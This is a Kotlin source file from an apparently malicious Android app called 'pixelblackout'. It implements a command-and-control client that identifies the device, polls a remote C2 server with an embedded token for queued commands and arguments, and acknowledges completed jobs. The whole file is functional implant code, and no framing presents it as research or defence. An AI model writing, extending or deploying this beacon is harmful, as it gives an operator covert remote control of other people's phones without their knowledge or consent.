package com.example.pixelblackout.c2

import android.content.Context
import android.util.Log
import com.example.pixelblackout.BuildConfig
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets

object HttpC2Client {
    private const val TAG = "HttpC2Client"

    private fun base(): String = BuildConfig.C2_BASE
    private fun token(): String = BuildConfig.C2_TOKEN

    fun fetchNextJob(context: Context): C2Job? {
        return try {
            val device = DeviceId.get(context)
            val url = URL("${base()}/api/device/${device}/next?token=${token()}")
            val conn = (url.openConnection() as HttpURLConnection).apply {
                connectTimeout = 4000
                readTimeout = 4000
                requestMethod = "GET"
            }
            try {
                val code = conn.responseCode
                if (code == 204) return null
                if (code !in 200..299) return null
                val body = conn.inputStream.use { it.readBytes() }
                val text = String(body, StandardCharsets.UTF_8)
                val json = JSONObject(text)
                C2Job(
                    id = json.optString("id"),
                    cmd = json.optString("cmd"),
                    arg = json.optString("arg", null)
                )
            } finally {
                conn.disconnect()
            }
        } catch (e: Exception) {
            Log.d(TAG, "fetchNextJob error: ${e.message}")
            null
        }
    }

    fun ackJob(context: Context, job: C2Job) {
        runCatching {
            val device = DeviceId.get(context)
            val url = URL("${base()}/api/device/${device}/ack/${job.id}?token=${token()}")
            val conn = (url.openConnection() as HttpURLConnection).apply {
                connectTimeout = 3000
                readTimeout = 3000
                requestMethod = "POST"
                doOutput = true
            }
            try {
                conn.outputStream.use { it.write(ByteArray(0)) }
                conn.responseCode
            } finally {
                conn.disconnect()
            }
        }
    }
}
